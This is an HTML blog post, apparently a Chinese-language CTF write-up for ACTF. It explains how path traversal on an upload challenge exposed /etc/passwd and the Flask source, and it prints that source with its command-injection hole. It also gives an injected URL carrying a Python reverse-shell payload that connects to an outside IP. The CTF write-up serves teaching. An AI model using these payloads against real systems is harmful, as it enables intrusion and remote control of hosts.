@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            ACTF个人wp
+        </div>
+        <div class="post-meta">
+            2025-05-02
+        </div>
+        <div class="post-md">
+            <span id="more"></span>
+<h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>admin不能直接爆破好像，全都是500报错。先随便注册一个账号登进去</p>
+<p>上传文件界面会发现看不到只有一个img标签，且是data数据，base64加密的图片数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161848598.png" alt="image-20250426161848598"></p>
+<p>尝试直接在file_path参数后面拼接路径读取文件，<code>../../etc/passwd</code>有回显。</p>
+<p>把显示出来的数据拿去解密下载下来即可得到数据：<br><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426162057409.png" alt="image-20250426162057409"></p>
+<p>，尝试读取<code>/proc/self/environ</code>看看有没有直接的flag（,发现灭有 <code>/proc/self/cmdline</code>中显示当前有进程：<code>python /app/app.py </code>于是得到源码app.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发现需要admin权限之后会有一个无回显的命令拼接执行，把哈希值拿去在线网站解密如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161323268.png" alt="image-20250426161323268"></p>
+<p>得到admin账户的密码，登录admin账户之后就发现确实是无回显，这里我尝试了好几次反弹shell，好像是环境的问题，后面才成功终于反弹成功。</p>
+<p>这里贴一下总结反弹shell命令的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527">反弹shell汇总，看我一篇就够了-CSDN博客</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">223.112.5.141:55140</span>/upload?file_path=<span class="number">111</span>;python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;156.226.172.136&#x27;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161215818.png" alt="image-20250426161215818"></p>
+<h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p><strong>描述</strong>：</p>
+<p>your favorite frontend challenge</p>
+<p>附件：b5</p>
+<h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h2><p><strong>描述</strong>：</p>
+<p>My site is PERFECT!!!<br>hosts: 0.0.0.0 ezmail.org</p>
+<p>附件：5a</p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
